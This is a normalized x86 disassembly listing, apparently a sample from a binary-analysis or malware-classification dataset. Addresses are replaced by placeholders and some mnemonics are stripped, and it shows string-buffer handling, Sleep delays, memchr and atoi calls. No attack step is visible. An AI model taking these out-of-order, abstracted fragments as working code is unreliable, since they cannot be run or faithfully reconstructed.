jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x51c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x2
mov [ ebp - 0x4a18 ] eax
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x4a14 ] ecx
mov edx [ ebp - 0x4a14 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x51c ] 0x0
mov [ ebp - 0x518 ] 0x0
mov [ ebp - 0x514 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x51c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x1
mov [ ebp - 0x4ba8 ] eax
mov ecx [ ebp - 0x4ba8 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4ba8 ]
mov [ eax ] dl
lea ecx [ ebp - 0x4910 ]
push ecx
mov ecx rw-data
call sub_4082e0
push 0x1
lea ecx [ ebp - 0x4910 ]
call sub_4063b0
jmp r-xdata
push 0x4e20
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
mov eax [ r--data ]
mov [ ebp - 0x4ac8 ] eax
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x4acc ]
mov [ ebp - 0x4ab8 ] edx
mov eax [ ebp - 0x4ac4 ]
cmp eax [ ebp - 0x4ab8 ]
ja r-xdata
mov eax [ ebp - 0x4acc ]
mov [ ebp - 0x4ac8 ] eax
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x494c ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x2530 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4a7c ]
mov edi rw-data
mov esi [ ebp - 0x4a74 ]
xor edx edx
mov [ ebp - 0x4bec ] edx
[ esi ] [ edi ]
je r-xdata
mov ecx [ ebp - 0x4a5c ]
sub ecx [ ebp - 0x4a60 ]
add ecx 0x1
mov edx [ ebp - 0x4a58 ]
sub edx ecx
mov [ ebp - 0x4a58 ] edx
mov eax [ ebp - 0x4a5c ]
add eax 0x1
mov [ ebp - 0x4a60 ] eax
mov [ ebp - 0x51c ] 0x0
mov [ ebp - 0x518 ] 0x0
mov [ ebp - 0x514 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x51c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x1
mov [ ebp - 0x4bc0 ] eax
mov ecx [ ebp - 0x4bc0 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bc0 ]
mov [ eax ] dl
jmp r-xdata
cmp [ ebp - 0x48c ] 0x0
jne r-xdata
mov eax [ ebp - 0x514 ]
add eax 0x2
mov [ ebp - 0x49f0 ] eax
mov ecx [ ebp - 0x51c ]
sub ecx 0x1
mov [ ebp - 0x49ec ] ecx
mov edx [ ebp - 0x49ec ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x51c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x4b2c ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov [ ebp - 0x4b24 ] ecx
cmp [ ebp - 0x4b24 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x483c ]
call sub_407050
lea ecx [ ebp - 0x483c ]
call sub_4072d0
mov cl [ ebp - 0x4954 ]
mov [ ebp - 0x484c ] cl
xor edx edx
test edx edx
je r-xdata
mov ecx [ ebp - 0x4ac4 ]
sub ecx 0x1
mov edx [ ebp - 0x4ab8 ]
sub edx ecx
mov [ ebp - 0x4ab8 ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x4acc ]
mov [ ebp - 0x4ac0 ] eax
jmp r-xdata
cmp [ ebp - 0x4ac8 ] 0x0
jne r-xdata
mov [ ebp - 0x494c ] 0x0
mov [ ebp - 0x4948 ] 0x0
mov [ ebp - 0x4944 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x494c ]
xor ecx ecx
mov cl [ eax - 0x1 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x2530 ] 0x0
mov [ ebp - 0x252c ] 0x0
mov [ ebp - 0x2528 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x2530 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4bec ]
mov [ ebp - 0x4bf0 ] ecx
cmp [ ebp - 0x4bf0 ] 0x0
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x4bec ] eax
jmp r-xdata
cmp [ ebp - 0x48c ] 0x0
jne r-xdata
mov eax [ ebp - 0x514 ]
add eax 0x2
mov [ ebp - 0x4a20 ] eax
mov ecx [ ebp - 0x51c ]
sub ecx 0x1
mov [ ebp - 0x4a1c ] ecx
mov edx [ ebp - 0x4a1c ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x51c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x48c ] 0x0
mov [ ebp - 0x488 ] 0x0
mov [ ebp - 0x484 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x48c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x51c ]
sub eax 0x1
mov [ ebp - 0x4bac ] eax
mov ecx [ ebp - 0x4bac ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bac ]
mov [ eax ] dl
mov ecx [ ebp - 0x4b2c ]
cmp ecx [ ebp - 0x20 ]
jae r-xdata
mov edx [ ebp - 0x4b2c ]
cmp edx [ ebp - 0x20 ]
ja r-xdata
jmp r-xdata
cmp [ ebp - 0x4848 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4ab8 ]
push ecx
movsx edx [ rw-data ]
push edx
mov eax [ ebp - 0x4ac0 ]
push eax
call memchr
add esp 0xc
mov [ ebp - 0x4abc ] eax
cmp [ ebp - 0x4abc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4944 ]
add ecx 0x2
mov [ ebp - 0x4ab4 ] ecx
mov edx [ ebp - 0x494c ]
sub edx 0x1
mov [ ebp - 0x4ab0 ] edx
mov eax [ ebp - 0x4ab0 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x494c ]
xor eax eax
mov al [ edx - 0x1 ]
cmp eax 0xff
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2528 ]
add eax 0x2
mov [ ebp - 0x4a8c ] eax
mov ecx [ ebp - 0x2530 ]
sub ecx 0x1
mov [ ebp - 0x4a88 ] ecx
mov edx [ ebp - 0x4a88 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2530 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x4a74 ]
sub edx [ ebp - 0x24 ]
mov [ ebp - 0x4a80 ] edx
jmp r-xdata
mov [ ebp - 0x48c ] 0x0
mov [ ebp - 0x488 ] 0x0
mov [ ebp - 0x484 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x48c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x51c ]
sub eax 0x1
mov [ ebp - 0x4bc4 ] eax
mov ecx [ ebp - 0x4bc4 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bc4 ]
mov [ eax ] dl
jmp r-xdata
cmp [ ebp - 0x2d0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x484 ]
add eax 0x2
mov [ ebp - 0x49f8 ] eax
mov ecx [ ebp - 0x48c ]
sub ecx 0x1
mov [ ebp - 0x49f4 ] ecx
mov edx [ ebp - 0x49f4 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x48c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov eax [ r--data ]
mov [ ebp - 0x4b28 ] eax
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x4b2c ]
mov [ ebp - 0x4b18 ] edx
mov eax [ ebp - 0x4b24 ]
cmp eax [ ebp - 0x4b18 ]
ja r-xdata
mov eax [ ebp - 0x4b2c ]
mov [ ebp - 0x4b28 ] eax
jmp r-xdata
mov [ ebp - 0x4848 ] 0x0
mov [ ebp - 0x4844 ] 0x0
mov [ ebp - 0x4840 ] 0x0
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
lea ecx [ ebp - 0x483c ]
call sub_4070e0
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov [ rw-data ] ecx
mov ecx 0x800
xor eax eax
lea edi [ ebp - 0x4830 ]
[ edi ]
mov edi rw-data
lea edx [ ebp - 0x4830 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ rw-data ]
mov [ ebp - 0x4834 ] ecx
mov edx [ ebp - 0x4834 ]
push edx
lea eax [ ebp - 0x4830 ]
push eax
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp - 0x4848 ]
xor ecx ecx
mov cl [ eax - 0x1 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4ac4 ]
mov edi rw-data
mov esi [ ebp - 0x4abc ]
xor edx edx
mov [ ebp - 0x4c0c ] edx
[ esi ] [ edi ]
je r-xdata
mov ecx [ ebp - 0x494c ]
sub ecx 0x1
mov [ ebp - 0x4c08 ] ecx
mov edx [ ebp - 0x4c08 ]
mov al [ edx ]
sub al 0x1
mov ecx [ ebp - 0x4c08 ]
mov [ ecx ] al
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2530 ]
sub eax 0x1
mov [ ebp - 0x4bf4 ] eax
mov ecx [ ebp - 0x4bf4 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bf4 ]
mov [ eax ] dl
mov ecx [ ebp - 0x4a74 ]
sub ecx [ ebp - 0x4a78 ]
add ecx 0x1
mov edx [ ebp - 0x4a70 ]
sub edx ecx
mov [ ebp - 0x4a70 ] edx
mov eax [ ebp - 0x4a74 ]
add eax 0x1
mov [ ebp - 0x4a78 ] eax
jmp r-xdata
cmp [ ebp - 0x2d0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x484 ]
add eax 0x2
mov [ ebp - 0x4a28 ] eax
mov ecx [ ebp - 0x48c ]
sub ecx 0x1
mov [ ebp - 0x4a24 ] ecx
mov edx [ ebp - 0x4a24 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x48c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x2d0 ] 0x0
mov [ ebp - 0x2cc ] 0x0
mov [ ebp - 0x2c8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x2d0 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x48c ]
sub eax 0x1
mov [ ebp - 0x4bb0 ] eax
mov ecx [ ebp - 0x4bb0 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bb0 ]
mov [ eax ] dl
push 0x64
call [ Sleep@IAT ]
mov ecx 0x80
xor eax eax
lea edi [ ebp - 0x2c0 ]
[ edi ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x4b30 ] ecx
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4b24 ]
sub ecx 0x1
mov edx [ ebp - 0x4b18 ]
sub edx ecx
mov [ ebp - 0x4b18 ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x4b2c ]
mov [ ebp - 0x4b20 ] eax
jmp r-xdata
cmp [ ebp - 0x4b28 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4964 ]
push ecx
mov ecx rw-data
call sub_4082e0
mov edx 0x1
test edx edx
je r-xdata
push 0x4e20
call [ Sleep@IAT ]
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4840 ]
add ecx 0x2
mov [ ebp - 0x4ad4 ] ecx
mov edx [ ebp - 0x4848 ]
sub edx 0x1
mov [ ebp - 0x4ad0 ] edx
mov eax [ ebp - 0x4ad0 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x4848 ]
xor eax eax
mov al [ edx - 0x1 ]
cmp eax 0xff
jne r-xdata
mov ecx [ ebp - 0x4c0c ]
mov [ ebp - 0x4c10 ] ecx
cmp [ ebp - 0x4c10 ] 0x0
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x4c0c ] eax
jmp r-xdata
cmp [ ebp - 0x51c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x2
mov [ ebp - 0x4a94 ] eax
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x4a90 ] ecx
mov edx [ ebp - 0x4a90 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x2d0 ] 0x0
mov [ ebp - 0x2cc ] 0x0
mov [ ebp - 0x2c8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x2d0 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x48c ]
sub eax 0x1
mov [ ebp - 0x4bc8 ] eax
mov ecx [ ebp - 0x4bc8 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bc8 ]
mov [ eax ] dl
mov eax [ ebp - 0x2c8 ]
add eax 0x2
mov [ ebp - 0x4a00 ] eax
mov ecx [ ebp - 0x2d0 ]
sub ecx 0x1
mov [ ebp - 0x49fc ] ecx
mov edx [ ebp - 0x49fc ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2d0 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x4c40 ] edx
mov [ ebp - 0x4c40 ] r--data
jmp r-xdata
mov ecx [ ebp - 0x4b18 ]
push ecx
movsx edx [ rw-data ]
push edx
mov eax [ ebp - 0x4b20 ]
push eax
call memchr
add esp 0xc
mov [ ebp - 0x4b1c ] eax
cmp [ ebp - 0x4b1c ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x4960 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4848 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4848 ]
sub ecx 0x1
mov [ ebp - 0x4c14 ] ecx
mov edx [ ebp - 0x4c14 ]
mov al [ edx ]
sub al 0x1
mov ecx [ ebp - 0x4c14 ]
mov [ ecx ] al
jmp r-xdata
mov edx [ ebp - 0x4abc ]
sub edx [ ebp - 0x24 ]
mov [ ebp - 0x4ac8 ] edx
jmp r-xdata
mov [ ebp - 0x51c ] 0x0
mov [ ebp - 0x518 ] 0x0
mov [ ebp - 0x514 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x51c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x1
mov [ ebp - 0x4bf8 ] eax
mov ecx [ ebp - 0x4bf8 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bf8 ]
mov [ eax ] dl
mov eax [ ebp - 0x2c8 ]
add eax 0x2
mov [ ebp - 0x4a30 ] eax
mov ecx [ ebp - 0x2d0 ]
sub ecx 0x1
mov [ ebp - 0x4a2c ] ecx
mov edx [ ebp - 0x4a2c ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2d0 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov eax [ ebp - 0x2d0 ]
sub eax 0x1
mov [ ebp - 0x4bb4 ] eax
mov ecx [ ebp - 0x4bb4 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bb4 ]
mov [ eax ] dl
jmp r-xdata
lea ecx [ ebp - 0x4858 ]
call sub_407050
lea ecx [ ebp - 0x4858 ]
call sub_4072d0
lea ecx [ ebp - 0x2c0 ]
push ecx
call atoi
add esp 0x4
mov [ ebp - 0x4850 ] eax
cmp [ ebp - 0x4850 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4b30 ]
sub ecx 0x4
mov esi [ ebp - 0x4c40 ]
add esi 0x4
lea edi [ ebp - 0x2c0 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebp - 0x480 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4b24 ]
mov edi rw-data
mov esi [ ebp - 0x4b1c ]
xor edx edx
mov [ ebp - 0x4c38 ] edx
[ esi ] [ edi ]
je r-xdata
mov [ ebp - 0x4960 ] 0x0
mov [ ebp - 0x495c ] 0x0
mov [ ebp - 0x4958 ] 0x0
mov edx 0x1
test edx edx
je r-xdata
mov eax [ ebp - 0x4960 ]
xor ecx ecx
mov cl [ eax - 0x1 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4848 ] 0x0
mov [ ebp - 0x4844 ] 0x0
mov [ ebp - 0x4840 ] 0x0
lea ecx [ ebp - 0x483c ]
call sub_407060
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x4848 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4abc ]
sub ecx [ ebp - 0x4ac0 ]
add ecx 0x1
mov edx [ ebp - 0x4ab8 ]
sub edx ecx
mov [ ebp - 0x4ab8 ] edx
mov eax [ ebp - 0x4abc ]
add eax 0x1
mov [ ebp - 0x4ac0 ] eax
jmp r-xdata
cmp [ ebp - 0x48c ] 0x0
jne r-xdata
mov eax [ ebp - 0x514 ]
add eax 0x2
mov [ ebp - 0x4a9c ] eax
mov ecx [ ebp - 0x51c ]
sub ecx 0x1
mov [ ebp - 0x4a98 ] ecx
mov edx [ ebp - 0x4a98 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x51c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov eax [ ebp - 0x2d0 ]
sub eax 0x1
mov [ ebp - 0x4bcc ] eax
mov ecx [ ebp - 0x4bcc ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bcc ]
mov [ eax ] dl
mov eax [ ebp - 0x4850 ]
push eax
lea ecx [ ebp - 0x4858 ]
call sub_407500
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea edx [ ebp - 0x2c0 ]
push edx
lea ecx [ ebp - 0x4858 ]
call sub_407620
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov ecx [ ebp - 0x4c38 ]
mov [ ebp - 0x4c3c ] ecx
cmp [ ebp - 0x4c3c ] 0x0
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x4c38 ] eax
jmp r-xdata
cmp [ ebp - 0x4848 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4958 ]
add ecx 0x2
mov [ ebp - 0x4b0c ] ecx
mov edx [ ebp - 0x4960 ]
sub edx 0x1
mov [ ebp - 0x4b08 ] edx
mov eax [ ebp - 0x4b08 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x4960 ]
xor eax eax
mov al [ edx - 0x1 ]
cmp eax 0xff
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x2530 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4840 ]
add eax 0x2
mov [ ebp - 0x4adc ] eax
mov ecx [ ebp - 0x4848 ]
sub ecx 0x1
mov [ ebp - 0x4ad8 ] ecx
mov edx [ ebp - 0x4ad8 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x4848 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x48c ] 0x0
mov [ ebp - 0x488 ] 0x0
mov [ ebp - 0x484 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x48c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x51c ]
sub eax 0x1
mov [ ebp - 0x4bfc ] eax
mov ecx [ ebp - 0x4bfc ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bfc ]
mov [ eax ] dl
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x0
mov ecx 0x13
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x4b1c ]
sub edx [ ebp - 0x24 ]
mov [ ebp - 0x4b28 ] edx
jmp r-xdata
mov [ ebp - 0x4848 ] 0x0
mov [ ebp - 0x4844 ] 0x0
mov [ ebp - 0x4840 ] 0x0
lea ecx [ ebp - 0x483c ]
call sub_407060
jmp r-xdata
mov eax [ ebp - 0x4848 ]
xor ecx ecx
mov cl [ eax - 0x1 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4960 ]
sub ecx 0x1
mov [ ebp - 0x4c30 ] ecx
mov edx [ ebp - 0x4c30 ]
mov al [ edx ]
sub al 0x1
mov ecx [ ebp - 0x4c30 ]
mov [ ecx ] al
mov [ ebp - 0x2530 ] 0x0
mov [ ebp - 0x252c ] 0x0
mov [ ebp - 0x2528 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x2530 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4848 ]
sub eax 0x1
mov [ ebp - 0x4c18 ] eax
mov ecx [ ebp - 0x4c18 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c18 ]
mov [ eax ] dl
jmp r-xdata
cmp [ ebp - 0x2d0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x484 ]
add eax 0x2
mov [ ebp - 0x4aa4 ] eax
mov ecx [ ebp - 0x48c ]
sub ecx 0x1
mov [ ebp - 0x4aa0 ] ecx
mov edx [ ebp - 0x4aa0 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x48c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
lea ecx [ ebp - 0x4974 ]
push ecx
mov ecx rw-data
call sub_4082e0
mov edx 0x1
test edx edx
je r-xdata
push 0x4e20
call [ Sleep@IAT ]
lea ecx [ ebp - 0x4858 ]
call sub_407060
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4b1c ]
sub ecx [ ebp - 0x4b20 ]
add ecx 0x1
mov edx [ ebp - 0x4b18 ]
sub edx ecx
mov [ ebp - 0x4b18 ] edx
mov eax [ ebp - 0x4b1c ]
add eax 0x1
mov [ ebp - 0x4b20 ] eax
mov ecx [ ebp - 0x4840 ]
add ecx 0x2
mov [ ebp - 0x4b14 ] ecx
mov edx [ ebp - 0x4848 ]
sub edx 0x1
mov [ ebp - 0x4b10 ] edx
mov eax [ ebp - 0x4b10 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x4848 ]
xor eax eax
mov al [ edx - 0x1 ]
cmp eax 0xff
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2528 ]
add eax 0x2
mov [ ebp - 0x4ae4 ] eax
mov ecx [ ebp - 0x2530 ]
sub ecx 0x1
mov [ ebp - 0x4ae0 ] ecx
mov edx [ ebp - 0x4ae0 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2530 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x2d0 ] 0x0
mov [ ebp - 0x2cc ] 0x0
mov [ ebp - 0x2c8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x2d0 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x48c ]
sub eax 0x1
mov [ ebp - 0x4c00 ] eax
mov ecx [ ebp - 0x4c00 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c00 ]
mov [ eax ] dl
jmp r-xdata
cmp [ ebp - 0x4970 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x2530 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4848 ]
sub ecx 0x1
mov [ ebp - 0x4c34 ] ecx
mov edx [ ebp - 0x4c34 ]
mov al [ edx ]
sub al 0x1
mov ecx [ ebp - 0x4c34 ]
mov [ ecx ] al
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2530 ]
sub eax 0x1
mov [ ebp - 0x4c1c ] eax
mov ecx [ ebp - 0x4c1c ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c1c ]
mov [ eax ] dl
mov eax [ ebp - 0x2c8 ]
add eax 0x2
mov [ ebp - 0x4aac ] eax
mov ecx [ ebp - 0x2d0 ]
sub ecx 0x1
mov [ ebp - 0x4aa8 ] ecx
mov edx [ ebp - 0x4aa8 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2d0 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x4970 ] 0x0
mov [ ebp - 0x496c ] 0x0
mov [ ebp - 0x4968 ] 0x0
lea ecx [ ebp - 0x4858 ]
call sub_407060
mov eax [ ebp - 0x4970 ]
xor ecx ecx
mov cl [ eax - 0x1 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x2530 ] 0x0
mov [ ebp - 0x252c ] 0x0
mov [ ebp - 0x2528 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x2530 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x51c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x2
mov [ ebp - 0x4aec ] eax
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x4ae8 ] ecx
mov edx [ ebp - 0x4ae8 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov eax [ ebp - 0x2d0 ]
sub eax 0x1
mov [ ebp - 0x4c04 ] eax
